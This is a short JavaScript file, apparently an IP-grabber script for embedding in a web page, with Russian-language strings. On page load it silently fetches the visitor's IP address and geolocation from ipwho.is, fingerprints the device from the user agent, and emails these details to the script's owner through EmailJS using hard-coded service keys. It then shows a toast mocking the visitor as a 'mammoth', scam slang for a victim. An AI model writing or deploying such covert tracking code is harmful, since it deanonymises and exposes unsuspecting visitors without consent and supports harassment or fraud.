const EMAILJS_PUBLIC_KEY  = 'MQUQkkcFWlkEHr8k_';
const EMAILJS_SERVICE_ID  = 'service_cj3r19v';
const EMAILJS_TEMPLATE_ID = 'template_u7o6rot';

function showToast(msg, type = '') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast show ' + type;
  setTimeout(() => t.className = 'toast', 3500);
}

async function collectAndSend() {
  let geo = {};
  try {
    geo = await fetch('https://ipwho.is/').then(r => r.json());
  } catch(e) {}

  const ua = navigator.userAgent;
  let device = 'Компьютер';
  if (/Mobi|Android/i.test(ua)) device = 'Телефон';
  else if (/Tablet|iPad/i.test(ua)) device = 'Планшет';

  let browser = 'Unknown';
  if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Edg')) browser = 'Edge';
  else if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Safari')) browser = 'Safari';

  let os = 'Unknown';
  if (ua.includes('Windows NT 10')) os = 'Windows 10/11';
  else if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac OS X')) os = 'macOS';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
  else if (ua.includes('Linux')) os = 'Linux';

  const params = {
    visit_time: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
    page_url:   window.location.href,
    ip:         geo.ip                        || 'н/д',
    country:    geo.country                   || '?',
    city:       geo.city                      || '?',
    region:     geo.region                    || '?',
    device:     device,
  };

  try {
    emailjs.init(EMAILJS_PUBLIC_KEY);
    await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);
    showToast('Твой IP у меня! ну ты и мамонт', 'success');
  } catch(err) {
    console.warn('EmailJS error:', err);
  }
}

window.addEventListener('load', collectAndSend);